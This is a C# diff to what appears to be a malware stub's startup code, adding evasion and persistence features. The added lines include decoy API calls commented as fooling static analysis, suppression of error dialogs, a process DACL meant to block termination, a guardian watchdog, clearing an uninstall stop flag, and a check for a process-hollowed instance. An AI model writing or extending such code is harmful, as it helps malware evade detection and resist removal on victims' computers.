@@ -51,11 +51,47 @@ partial class Program
         catch { }
     }
 
+    [LibraryImport("kernel32.dll")]
+    private static partial uint SetErrorMode(uint uMode);
+
+    [LibraryImport("kernel32.dll")]
+    private static partial uint GetACP();
+    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf16)]
+    private static partial int GetLocaleInfoW(uint Locale, uint LCType, nint lpLCData, int cchData);
+    [LibraryImport("kernel32.dll")]
+    private static partial nint GetStdHandle(int nStdHandle);
+    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf16)]
+    private static partial uint GetModuleFileNameW(nint hModule, nint lpFilename, uint nSize);
+    [LibraryImport("user32.dll")]
+    private static partial int GetSystemMetrics(int nIndex);
+    [LibraryImport("kernel32.dll")]
+    private static partial ulong GetTickCount64();
+
+    // Junk initialization — looks like normal app startup to static analysis
+    private static void _InitRuntime()
+    {
+        _ = GetACP();
+        _ = GetLocaleInfoW(0x0409, 0x59, nint.Zero, 0);
+        _ = GetStdHandle(-10);
+        _ = GetSystemMetrics(0);
+        _ = GetSystemMetrics(1);
+        _ = GetTickCount64();
+        unsafe { var buf = stackalloc char[260]; GetModuleFileNameW(nint.Zero, (nint)buf, 260); }
+    }
+
     [STAThread]
     static async Task Main()
     {
+        // Suppress crash/WER dialogs — prevents "buffer overrun" popup when DACL blocks external kill
+        SetErrorMode(0x0001 | 0x0002 | 0x8000);
+        _InitRuntime();
+
         // Guardian check: if launched as guardian, monitor parent and exit
         if (Protection.RunAsGuardianIfNeeded()) return;
+
+        // Clear any leftover stop flag from a previous uninstall so that
+        // a freshly-launched stub is not immediately blocked by guardians.
+        Protection.ClearStopFlag();
 
         // Single instance (if mutex is enabled)
         if (Config.UseMutex)
@@ -63,6 +99,13 @@ partial class Program
             _mutex = new Mutex(true, Config.MutexName, out bool created);
             if (!created) { Breadcrumb("EXIT: mutex already held"); return; }
         }
+
+        // Apply DACL immediately — before any delay or check — so the process is
+        // protected from TerminateProcess() during the entire startup window.
+        // Without this, a re-launched process can be killed in the 2-4s gap
+        // between relaunch and the watchdog setup at the end of Main().
+        if (Config.EnableWatchdog && !ProcessHollowing.IsHollowedInstance())
+            Protection.ProtectProcessDacl();
 
         bool admin = IsAdmin();
         Breadcrumb($"START admin={admin} path={Environment.ProcessPath}");
